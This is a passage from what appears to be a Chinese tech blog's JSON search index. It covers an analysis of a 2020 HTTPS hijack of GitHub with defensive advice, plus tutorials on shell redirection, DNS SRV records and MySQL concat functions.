60","date":"2020-03-27","objectID":"https://lgf.im/posts/events/mitm-https-hijack-github/:1:1","tags":["github","MITM","https","hijack"],"title":"Github等大面积https劫持","uri":"https://lgf.im/posts/events/mitm-https-hijack-github/"},{"categories":["coding"],"content":"香港阿里云 点击展开 ➜ ~ openssl s_client -showcerts -connect github.com:443 \u003c /dev/null CONNECTED(00000005) depth=2 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA verify return:1 depth=1 C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA verify return:1 depth=0 businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = \"GitHub, Inc.\", CN = github.com verify return:1 --- Certificate chain 0 s:businessCategory = Private Organization, jurisdictionC = US, jurisdictionST = Delaware, serialNumber = 5157550, C = US, ST = California, L = San Francisco, O = \"GitHub, Inc.\", CN = github.com i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA -----BEGIN CERTIFICATE----- MIIHQjCCBiqgAwIBAgIQCgYwQn9bvO1pVzllk7ZFHzANBgkqhkiG9w0BAQsFADB1 MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3 d3cuZGlnaWNlcnQuY29tMTQwMgYDVQQDEytEaWdpQ2VydCBTSEEyIEV4dGVuZGVk IFZhbGlkYXRpb24gU2VydmVyIENBMB4XDTE4MDUwODAwMDAwMFoXDTIwMDYwMzEy MDAwMFowgccxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRMwEQYLKwYB BAGCNzwCAQMTAlVTMRkwFwYLKwYBBAGCNzwCAQITCERlbGF3YXJlMRAwDgYDVQQF Ewc1MTU3NTUwMQswCQYDVQQGEwJVUzETMBEGA1UECBMKQ2FsaWZvcm5pYTEWMBQG A1UEBxMNU2FuIEZyYW5jaXNjbzEVMBMGA1UEChMMR2l0SHViLCBJbmMuMRMwEQYD VQQDEwpnaXRodWIuY29tMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA xjyq8jyXDDrBTyitcnB90865tWBzpHSbindG/XqYQkzFMBlXmqkzC+FdTRBYyneZ w5Pz+XWQvL+74JW6LsWNc2EF0xCEqLOJuC9zjPAqbr7uroNLghGxYf13YdqbG5oj /4x+ogEG3dF/U5YIwVr658DKyESMV6eoYV9mDVfTuJastkqcwero+5ZAKfYVMLUE sMwFtoTDJFmVf6JlkOWwsxp1WcQ/MRQK1cyqOoUFUgYylgdh3yeCDPeF22Ax8AlQ xbcaI+GwfQL1FB7Jy+h+KjME9lE/UpgV6Qt2R1xNSmvFCBWu+NFX6epwFP/JRbkM fLz0beYFUvmMgLtwVpEPSwIDAQABo4IDeTCCA3UwHwYDVR0jBBgwFoAUPdNQpdag re7zSmAKZdMh1Pj41g8wHQYDVR0OBBYEFMnCU2FmnV+rJfQmzQ84mqhJ6kipMCUG A1UdEQQeMByCCmdpdGh1Yi5jb22CDnd3dy5naXRodWIuY29tMA4GA1UdDwEB/wQE AwIFoDAdBgNVHSUEFjAUBggrBgEFBQcDAQYIKwYBBQUHAwIwdQYDVR0fBG4wbDA0 oDKgMIYuaHR0cDovL2NybDMuZGlnaWNlcnQuY29tL3NoYTItZXYtc2VydmVyLWcy LmNybDA0oDKgMIYuaHR0cDovL2NybDQuZGlnaWNlcnQuY29tL3NoYTItZXYtc2Vy dmVyLWcyLmNybDBLBgNVHSAERDBCMDcGCWCGSAGG/WwCATAqMCgGCCsGAQUFBwIB FhxodHRwczovL3d3dy5kaWdpY2VydC5jb20vQ1BTMAcGBWeBDAEBMIGIBggrBgEF BQcBAQR8MHowJAYIKwYBBQUHMAGGGGh0dHA6Ly9vY3NwLmRpZ2ljZXJ0LmNvbTBS BggrBgEFBQcwAoZGaHR0cDovL2NhY2VydHMuZGlnaWNlcnQuY29tL0RpZ2lDZXJ0 U0hBMkV4dGVuZGVkVmFsaWRhdGlvblNlcnZlckNBLmNydDAMBgNVHRMBAf8EAjAA MIIBfgYKKwYBBAHWeQIEAgSCAW4EggFqAWgAdgCkuQmQtBhYFIe7E6LMZ3AKPDWY BPkb37jjd80OyA3cEAAAAWNBYm0KAAAEAwBHMEUCIQDRZp38cTWsWH2GdBpe/uPT Wnsu/m4BEC2+dIcvSykZYgIgCP5gGv6yzaazxBK2NwGdmmyuEFNSg2pARbMJlUFg U5UAdgBWFAaaL9fC7NP14b1Esj7HRna5vJkRXMDvlJhV1onQ3QAAAWNBYm0tAAAE AwBHMEUCIQCi7omUvYLm0b2LobtEeRAYnlIo7n6JxbYdrtYdmPUWJQIgVgw1AZ51 vK9ENinBg22FPxb82TvNDO05T17hxXRC2IYAdgC72d+8H4pxtZOUI5eqkntHOFeV CqtS6BqQlmQ2jh7RhQAAAWNBYm3fAAAEAwBHMEUCIQChzdTKUU2N+XcqcK0OJYrN 8EYynloVxho4yPk6Dq3EPgIgdNH5u8rC3UcslQV4B9o0a0w204omDREGKTVuEpxG eOQwDQYJKoZIhvcNAQELBQADggEBAHAPWpanWOW/ip2oJ5grAH8mqQfaunuCVE+v ac+88lkDK/LVdFgl2B6kIHZiYClzKtfczG93hWvKbST4NRNHP9LiaQqdNC17e5vN HnXVUGw+yxyjMLGqkgepOnZ2Rb14kcTOGp4i5AuJuuaMwXmCo7jUwPwfLe1NUlVB Kqg6LK0Hcq4K0sZnxE8HFxiZ92WpV2AVWjRMEc/2z2shNoDvxvFUYyY1Oe67xINk myQKc+ygSBZzyLnXSFVWmHr3u5dcaaQGGAR42v6Ydr4iL38Hd4dOiBma+FXsXBIq WUjbST4VXmdaol7uzFMojA4zkxQDZAvF5XgJlAFadfySna/teik= -----END CERTIFICATE----- 1 s:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert SHA2 Extended Validation Server CA i:C = US, O = DigiCert Inc, OU = www.digicert.com, CN = DigiCert High Assurance EV Root CA -----BEGIN CERTIFICATE----- MIIEtjCCA56gAwIBAgIQDHmpRLCMEZUgkmFf4msdgzANBgkqhkiG9w0BAQsFADBs MQswCQYDVQQGEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMRkwFwYDVQQLExB3 d3cuZGlnaWNlcnQuY29tMSswKQYDVQQDEyJEaWdpQ2VydCBIaWdoIEFzc3VyYW5j ZSBFViBSb290IENBMB4XDTEzMTAyMjEyMDAwMFoXDTI4MTAyMjEyMDAwMFowdTEL MAkGA1UEBhMCVVMxFTATBgNVBAoTDERpZ2lDZXJ0IEluYzEZMBcGA1UECxMQd3d3 LmRpZ2ljZ","date":"2020-03-27","objectID":"https://lgf.im/posts/events/mitm-https-hijack-github/:1:2","tags":["github","MITM","https","hijack"],"title":"Github等大面积https劫持","uri":"https://lgf.im/posts/events/mitm-https-hijack-github/"},{"categories":["coding"],"content":"实施手段 通过检查网络和对出现的状况的分析，我认为这次MITM不是通过sni或者返回的证书进行的，而是直接针对某些ip的443端口进行的 通过控制这些ip的路由，让流量经过某些恶意节点，在某个恶意节点针对443端口进行MITM，而不检查实际访问的域名和返回的证书 并且这次事件所影响的github的ip并不全，通过doh或dot获取到国外服务器解析到的ip而不是国内使用的几个ip，可以正常访问github ","date":"2020-03-27","objectID":"https://lgf.im/posts/events/mitm-https-hijack-github/:2:0","tags":["github","MITM","https","hijack"],"title":"Github等大面积https劫持","uri":"https://lgf.im/posts/events/mitm-https-hijack-github/"},{"categories":["coding"],"content":"危害 使用TLS是保证我们访问网站时信息不被中间人窥探和篡改的有效手段，如果TLS用来加密通讯使用的证书出现问题，那么信息安全就无从谈起 TLS使用公钥密码算法交换后面数据进行对称加密使用的秘钥，作为中间人没有服务器上的私钥就无法解密获得后面加密使用的秘钥，所以即使截获到https的数据报文，也无法解密和篡改传输的内容 而本次事件使用的手法是MITM常用手法，通常情况下我们为了抓包和改包，会自己签署一个假的证书并导入自己被抓包设备的信任证书列表，然后中间人分别与服务器和客户端建立TLS连接，简单来说，中间人作为客户端从服务器获取内容，然后作为服务器向真正的客户端传输修改后的内容 所以如果我们信任了浏览器给出的警告，就会导致我们的信息包括github用户名、邮箱、密码、token和私有库泄露 ","date":"2020-03-27","objectID":"https://lgf.im/posts/events/mitm-https-hijack-github/:3:0","tags":["github","MITM","https","hijack"],"title":"Github等大面积https劫持","uri":"https://lgf.im/posts/events/mitm-https-hijack-github/"},{"categories":["coding"],"content":"如何防范 作为站长，首先可以确定的是，并没有什么用户无痛(无需用户进行任何操作和设置)的办法来绕过这类针对性的MITM攻击，如果需要保护用户的隐私，建议开启域名的HSTS策略，这样浏览器检查到证书错误时的警告页面上就不会显示 忽略警告 相关按钮，防止不懂的用户忽略安全警告进行访问，避免隐私数据泄露 当然，像昨天那种针对 Github Pages 的攻击只会导致用户无法访问，并不会带来隐私泄露，因为github pages是提供静态网页托管，根本不需要用户输入隐私数据 作为访客，因为这种中间人攻击肯定发生在路由路径的某一个节点处，所以我们可以使用代理绕过这个恶意节点，这应该是目前最简单最好用的方法了 同时，当我们在浏览器中发现此类警告，除非是对证书内容充分信任(如自己为了调试而签发的证书)，否则不要忽视任何此类的警告而强行访问，否则隐私信息泄露在所难免 因为我自己访问国外网站一直是使用代理，所以本次事件对我的影响几乎等于零 因为不受影响，所以也很难在第一时间发现这类事件，后续需要准备一个监控系统了 ","date":"2020-03-27","objectID":"https://lgf.im/posts/events/mitm-https-hijack-github/:4:0","tags":["github","MITM","https","hijack"],"title":"Github等大面积https劫持","uri":"https://lgf.im/posts/events/mitm-https-hijack-github/"},{"categories":["coding"],"content":"经常会看到别人的shell脚本后面有一个 2\u003e\u00261 ，一直没去深究，今天这个话题就以这个为出发点进行展开，学习一下linux shell中重定向的话题。 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:0:0","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"特殊的东西 先来看一点linux中特殊的东西，为后面的内容打下基础 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:1:0","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"特殊的文件 /dev/null 空，可以将垃圾内容导入其中，就会消失 /dev/zero 零，可以从中读出无穷无尽的0 /dev/urandom 随机数，可以从中读出无穷无尽的随机数 /dev/stdin 标准输入流 /dev/stdout 标准输出流 /dev/stderr 标准错误输出流 我们可以看到后三个文件其实是个链接，指向内核的文件描述符 0\\1\\2 lrwxrwxrwx 1 root root 15 Mar 24 16:20 stderr -\u003e /proc/self/fd/2 lrwxrwxrwx 1 root root 15 Mar 24 16:20 stdin -\u003e /proc/self/fd/0 lrwxrwxrwx 1 root root 15 Mar 24 16:20 stdout -\u003e /proc/self/fd/1 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:1:1","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"特殊的文件描述符 在Linux shell中有三个特殊的文件描述符（File descriptor or fd）: fd0 是标准输入: stdin fd1 是标准输出: stdout fd2 是标准错误输出: stderr 通过这三个特殊的文件描述符我们可以控制输入输出流 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:1:2","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"重定向 我们经常会接触到 \u003e 这个符号，叫做重定向，其实还有另一个符号 \u003e\u003e 有着类似的功能，他们之间有一点小区别： \u003e 是覆盖的方式 \u003e\u003e 是追加的方式 下面的内容将全部以 \u003e 为例，\u003e\u003e 除了内容是追加之外没有其他区别，就不赘述 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:2:0","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"使用重定向 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:3:0","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"重定向到文件 先来看一下最基本的重定向的使用方法，我们将 echo 命令的输出重定向到一个文件中 echo \"hello\" \u003e a.txt 执行结果： root@ubuntu:~# echo \"hello\" \u003e a.txt root@ubuntu:~# cat a.txt hello 这里是将 stdout 重定向到文件 a.txt 中，与下面的命令等价 echo \"hello\" 1\u003e a.txt 执行结果： root@ubuntu:~# rm a.txt root@ubuntu:~# echo \"hello\" 1\u003e a.txt root@ubuntu:~# cat a.txt hello 这里我们看到重定向符号 \u003e 默认是将 stdout 也就是 fd1 重定向到别处 如果我们想要将标准错误输出stderr进行重定向，只需要将上面命令中的文件描述符1修改为标准错误输出的文件描述符2即可 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:3:1","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"重定向到文件描述符 有些情况下 stderr 是会被程序控制写入错误日志的，如果我们想要在命令运行的时候将错误显示在屏幕上，就需要将错误输出重定向到标准输出流中 我们先来尝试一下, 这里我们没有找到一个合适的命令，就拿 ls 命令查看一个不存在的目录，这样会产生错误输出 这里错误默认是会被输出到屏幕的，只是我暂时没有找到一个更好的程序，我们先假设他不会输出到屏幕 ls error 2\u003e1 这里我们的猜想是将 stderr 重定向到 stdout, 所以写了 2\u003e1, 我们来看一下会不会成功？ root@ubuntu:~# ls error 2\u003e1 root@ubuntu:~# root@ubuntu:~# ls 1 root@ubuntu:~# cat 1 ls: cannot access 'error': No such file or directory 我们看到了，并没有输出，而是在当前目录下生成了一个文件 1, 这说明如果我们只写 \u003e1 会被当做重定向到文件 1 中 此时，我们的 \u0026 就要上场了 \u003e\u0026 是将一个流重定向到一个文件描述符的语法，所以刚刚我们应该指明要重定向到 fd1, 也就是 \u00261 ls error 2\u003e\u00261 执行结果： root@ubuntu:~# ls error 2\u003e\u00261 ls: cannot access 'error': No such file or directory 到这里我们就可以自主发挥了 将标准输出重定向到标准错误输出 echo \"hello\" 1\u003e\u00262 or echo \"hello\" \u003e\u00262 甚至我们可以玩点复杂的 (echo \"hello\" \u003e\u00269) 9\u003e\u00262 2\u003e\u00261 root@ubuntu:~# (echo \"hello\" \u003e\u00269) 9\u003e\u00262 2\u003e\u00261 hello 这里的文件描述符9会自动生成，但是去除括号就会提示错误了 root@ubuntu:~# echo \"hello\" \u003e\u00269 9\u003e\u00262 2\u003e\u00261 bash: 9: Bad file descriptor 在 bash \u003e4.0 的版本中，又出了新的重定向语法 $ ls -ld /tmp /tnt 2\u003e \u003e(sed 's/^/E: /') \u003e \u003e(sed 's/^/O: /') O: drwxrwxrwt 17 root root 28672 Nov 5 23:00 /tmp E: ls: cannot access /tnt: No such file or directory 这种写法我还没有学习，等我后面学会了再进行更新 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:3:2","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"格式化输出 来点高端点的用法 用于格式化输出, 将标准输出和错误输出两个流重定向到不同的处理中，最后汇总 ((ls -ld /tmp /tnt |sed 's/^/O: /' \u003e\u00269 ) 2\u003e\u00261 |sed 's/^/E: /') 9\u003e\u00261| cat -n root@ubuntu:~# ((ls -ld /tmp /tnt |sed 's/^/O: /' \u003e\u00269 ) 2\u003e\u00261 |sed 's/^/E: /') 9\u003e\u00261| cat -n 1 O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp 2 E: ls: cannot access '/tnt': No such file or directory 相同作用的新版语法 cat -n \u003c(ls -ld /tmp /tnt 2\u003e \u003e(sed 's/^/E: /') \u003e \u003e(sed 's/^/O: /')) root@ubuntu:~# cat -n \u003c(ls -ld /tmp /tnt 2\u003e \u003e(sed 's/^/E: /') \u003e \u003e(sed 's/^/O: /')) 1 O: drwxrwxrwt 1 root root 4096 Mar 22 18:59 /tmp 2 E: ls: cannot access '/tnt': No such file or directory ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:3:3","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"合并文件 将输出文件 m 和 n 合并: n \u003e\u0026 m 将输入文件 m 和 n 合并: n \u003c\u0026 m ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:3:4","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"输入边界 将开始标记 tag 和结束标记 tag 之间的内容作为输入: \u003c\u003c tag 例如： root@ubuntu:~# wc -l \u003c\u003c EOF document line 1 document line 2 document line 3 EOF 3 //表明收到3行输入 它的作用是将两个 EOF 之间的内容(document) 作为输入传递给 command。 注意： 结尾的delimiter 一定要顶格写，前面不能有任何字符，后面也不能有任何字符，包括空格和 tab 缩进 开始的delimiter前后的空格会被忽略掉 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:3:5","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"有关覆盖 如果我们用 set -o noclobber 设置bash，那bash将不会覆盖任何已经存在的文件，但是我们可以通过 \u003e| 绕过这个限制 先来看一下默认的情况 root@ubuntu:~# testfile=$(mktemp /tmp/testNoClobberDate-XXXXXX) root@ubuntu:~# date \u003e $testfile ; cat $testfile Tue 24 Mar 2020 05:05:53 PM CST root@ubuntu:~# date \u003e $testfile ; cat $testfile Tue 24 Mar 2020 05:05:56 PM CST root@ubuntu:~# date \u003e $testfile ; cat $testfile Tue 24 Mar 2020 05:06:13 PM CST 如预期的一样，每一次重定向都覆盖了原文件 下面我们设置 noclobber 标志 set -o noclobber 然后重复上面的操作试一下 root@ubuntu:~# date \u003e $testfile ; cat $testfile bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file Tue 24 Mar 2020 05:06:13 PM CST root@ubuntu:~# date \u003e $testfile ; cat $testfile bash: /tmp/testNoClobberDate-yKVkaY: cannot overwrite existing file Tue 24 Mar 2020 05:06:13 PM CST 我们看到了bash的提示，不能覆盖已存在的文件，实际结果也是一样 如何进行绕过呢? 我们来试一下用 \u003e| 代替 \u003e root@ubuntu:~# date \u003e| $testfile ; cat $testfile Tue 24 Mar 2020 05:10:45 PM CST root@ubuntu:~# date \u003e| $testfile ; cat $testfile Tue 24 Mar 2020 05:10:49 PM CST 我们发现此时可以覆盖已经存在的文件，我们查看一下目前的设置 root@ubuntu:~# set -o | grep noclobber noclobber on noclobber 的确是开启的，所以 \u003e| 的确可以绕过这一限制 使用 set +o noclobber 关闭这个限制，防止对我们后面的使用造成影响 root@ubuntu:~# set +o noclobber root@ubuntu:~# set -o | grep noclobber noclobber off root@ubuntu:~# rm $testfile ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:4:0","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"其他的小点 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:5:0","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"重定向到一处 如果我们要将 stdout 和 stderr 重定向到同一个地方，该怎么写呢？ 下面两种哪种是对的？ ls -ld /tmp /tnt 2\u003e\u00261 1\u003ea.txt ls -ld /tmp /tnt 1\u003eb.txt 2\u003e\u00261 验证一下 第一种写法 root@ubuntu:~# ls -ld /tmp /tnt 2\u003e\u00261 1\u003ea.txt ls: cannot access '/tnt': No such file or directory root@ubuntu:~# cat a.txt drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 第二种写法 root@ubuntu:~# ls -ld /tmp /tnt 1\u003eb.txt 2\u003e\u00261 root@ubuntu:~# cat b.txt ls: cannot access '/tnt': No such file or directory drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 我们可以看到第二种写法是正确的 同理，下面这种写法也正确 ls -ld /tmp /tnt 2\u003eb.txt 1\u003e\u00262 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:5:1","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"套个娃a 来点奇葩的，如果我们将 stderr 重定向到 stdout, 同时又将 stdout 重定向到 stderr 会发生什么？ 如此套娃会不会导致回环卡死？ 试一下 root@ubuntu:~# ls -ld /tmp /tnt 2\u003e\u00261 1\u003e\u00262 | sed -e s/^/++/ ++ls: cannot access '/tnt': No such file or directory ++drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 我们发现都会从标准输出出来 反过来呢？ root@ubuntu:~# ls -ld /tmp /tnt 1\u003e\u00262 2\u003e\u00261 | sed -e s/^/++/ ls: cannot access '/tnt': No such file or directory drwxrwxrwt 1 root root 4096 Mar 24 17:15 /tmp 我们发现都没有从标准输出出来，都是从标准错误输出出来的 也就是说 a\u003e\u0026b b\u003e\u0026a 这种套娃写法中， b才是出口 ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:5:2","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"阅读更多内容 如果你想了解功能，通过下面的命令查看官方文档吧 man -Len -Pless\\ +/^REDIRECTION bash 本文的参考资料： stack overflow ","date":"2020-03-24","objectID":"https://lgf.im/posts/linux/redirect-in-shell/:6:0","tags":["coding","shell","linux"],"title":"Linux Shell中的重定向","uri":"https://lgf.im/posts/linux/redirect-in-shell/"},{"categories":["coding"],"content":"SRV记录是服务器资源记录的缩写，是DNS服务器的数据库中支持的一种记录服务器提供的服务资源的记录，主要作用是说明一个服务器能够提供什么样的服务。 简单来说，SRV记录了哪台计算机提供了哪个服务这么一个简单的信息。 SRV记录是DNS记录中的新鲜面孔，在RFC2052中才对SRV记录进行了定义，因此很多老版本的DNS服务器并不支持SRV记录。 ","date":"2020-03-24","objectID":"https://lgf.im/posts/learn/dns-srv-record/:0:0","tags":["DNS","SRV"],"title":"DNS中SRV记录","uri":"https://lgf.im/posts/learn/dns-srv-record/"},{"categories":["coding"],"content":"RFC2782 概述和理由 目前，必须知道服务器的确切地址才能联系它或者广播问题。 SRV RR允许管理员为单个域名使用多个服务器，轻松地将服务从一个主机移动到另一个主机，并将某些主机指定为服务的主服务器，将其他主机指定为备份。 客户端要求特定域名的特定服务/协议（这里使用的词汇\"域名\"是RFC 1034上严格定义的），并获取任何可用服务器的名称。 请注意，在本文档引用“地址记录”时，它表示A RR，AAAA RR或其最现代的等价物。 RFC定义的格式 RFC2782中定义的格式是： _Service._Proto.Name TTL Class SRV Priority Weight Port Target 各字段详细说明： 字段 说明 Service 所需服务的符号名称。在Assigned Numbers或本地定义。服务标识符前面加上下划线_，以避免与自然界中出现的DNS标签发生冲突。 Proto 所需协议的符号名称。前面加下划线_，以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最常用的值，但可以使用由Assigned Numbers或本地定义的任何名称。 Proto不区分大小写。 Name 此RR所指的域名。在这个域名下SRV RR是唯一的。（英文原文好像有些语法问题） TTL Class Priority Weight Port 服务在目标主机上的端口。所需协议的符号名称，前面加下划线（_），以防止与自然界中出现的DNS标签发生冲突。 _TCP和_UDP目前是该字段最有用的值，但可以使用由Assigned Numbers定义的任何名称或本地的（如Service）。 Proto不区分大小写。范围是0-65535。 这是网络字节顺序中的16位无符号整数。 通常在Assigned Numbers中指定，但不一定如此。 Target 目标主机的域名。 域名必须有一个或多个地址记录，域名绝不能是别名。敦促（但不强求）实现在附加数据部分中返回地址记录。除非并且直到将来的标准操作允许，否则名称压缩不能用于此字段。值为“.” 表示该域名明确无法提供该服务。 ","date":"2020-03-24","objectID":"https://lgf.im/posts/learn/dns-srv-record/:0:1","tags":["DNS","SRV"],"title":"DNS中SRV记录","uri":"https://lgf.im/posts/learn/dns-srv-record/"},{"categories":["coding"],"content":"SRV记录和微软的关系 SRV记录在微软的Active Directory中有着重要地位，大家知道在NT4时代域和DNS并没有太多关系。但从Win2000开始，域就离不开DNS的帮助了，为什么呢？因为域内的计算机要依赖DNS的SRV记录来定位域控制器！微软的即时通讯服务器Live Communications Server也可以依靠SRV记录定位即时通讯服务器。 SRV 记录一般是为Microsoft的活动目录设置时的应用。DNS可以独立于活动目录，但是活动目录必须有DNS的帮助才能工作。为了活动目录能够正常的工作，DNS服务器必须支持服务定位（SRV）资源记录，资源记录把服务名字映射为提供服务的服务器名字。活动目录客户和域控制器使用SRV资源记录决定域控制器的IP地址。 鉴于SRV记录可以定位特定服务器的位置，我们可以预计，在微软将来的服务器产品中SRV记录将发挥越来越多的作用。 ","date":"2020-03-24","objectID":"https://lgf.im/posts/learn/dns-srv-record/:0:2","tags":["DNS","SRV"],"title":"DNS中SRV记录","uri":"https://lgf.im/posts/learn/dns-srv-record/"},{"categories":["coding"],"content":"讲解与示例 ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:0","tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/"},{"categories":["coding"],"content":"CONCAT(str1, str2, …) 返回结果为连接参数产生的字符串。如有任何一个参数为NULL ，则返回值为 NULL 参数可以是字段名或具体值 注意： 如果所有参数均为非二进制字符串，则结果为非二进制字符串 如果自变量中含有任一二进制字符串，则结果为一个二进制字符串 一个数字参数被转化为与之相等的二进制字符串格式 若要避免这种情况，可使用显式类型 cast, 例如： SELECT CONCAT(CAST(int_col AS CHAR), char_col) MySQL的concat函数可以连接一个或者多个字符串 mysql\u003e select concat('10'); +--------------+ | concat('10') | +--------------+ | 10 | +--------------+ 1 row in set (0.00 sec) mysql\u003e select concat('11','22','33'); +------------------------+ | concat('11','22','33') | +------------------------+ | 112233 | +------------------------+ 1 row in set (0.00 sec) MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL mysql\u003e select concat('11','22',null); +------------------------+ | concat('11','22',null) | +------------------------+ | NULL | +------------------------+ 1 row in set (0.00 sec) ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:1","tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/"},{"categories":["coding"],"content":"CONCAT_WS(separator,str1,str2,…) CONCAT_WS() 代表 CONCAT With Separator ，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。 注意： 参数可以是字段名或具体值 如果分隔符为 NULL，则结果为 NULL。函数会忽略任何分隔符参数后的 NULL 值。（只保留非空值） mysql\u003e select concat_ws('','','','33'); +--------------------------+ | concat_ws('','','','33') | +--------------------------+ | 33 | +--------------------------+ 1 row in set (0.04 sec) 如连接后以逗号分隔 mysql\u003e select concat_ws(',','11','22','33'); +-------------------------------+ | concat_ws(',','11','22','33') | +-------------------------------+ | 11,22,33 | +-------------------------------+ 1 row in set (0.00 sec) 和MySQL中concat函数不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL mysql\u003e select concat_ws(',','11','22',NULL); +-------------------------------+ | concat_ws(',','11','22',NULL) | +-------------------------------+ | 11,22 | +-------------------------------+ 1 row in set (0.00 sec) ","date":"2020-03-22","objectID":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/:1:2","tags":["mysql","sql","coding"],"title":"MySQL中几个concat的用法与区别","uri":"https://lgf.im/posts/security/web-security/mysql-concat-concat-ws-group-concat/"},{"categories":["coding"],"content":"GROUP_CONCAT() 函数 group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’]) 基本查询 mysql\u003e select * from aa; +------+------+ | id| name | +------+------+ |1 | 10| |1 | 20| |1 | 20| |2 | 20| |3 | 200 | |3 | 500 | +------+------+ 6 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔(默认) mysql\u003e select id,group_concat(name) from aa group by id; +------+--------------------+ | id| group_concat(name) | +------+--------------------+ |1 | 10,20,20| |2 | 20 | |3 | 200,500| +------+--------------------+ 3 rows in set (0.00 sec) 以id分组，把去冗余的name字段的值打印在一行，逗号分隔 mysql\u003e select id,group_concat(distinct name) from aa group by id; +------+-----------------------------+ | id| group_concat(distinct name) | +------+-----------------------------+ |1 | 10,20| |2 | 20 | |3 | 200,500 | +------+-----------------------------+ 3 rows in set (0.00 sec) 以id分组，把name字段的值打印在一行，逗号分隔，以name排倒序 mysql\u003e select id,group_concat(name order by name desc) from aa group by id; +------+---------------------------------------+ | id| group_concat(name order by name desc) | +------+---------------------------------------+ |1 | 20,20,10 | |2 | 20| |3 | 500,200| +------+---------------------------------------+ 3 rows in set (0.00 sec) 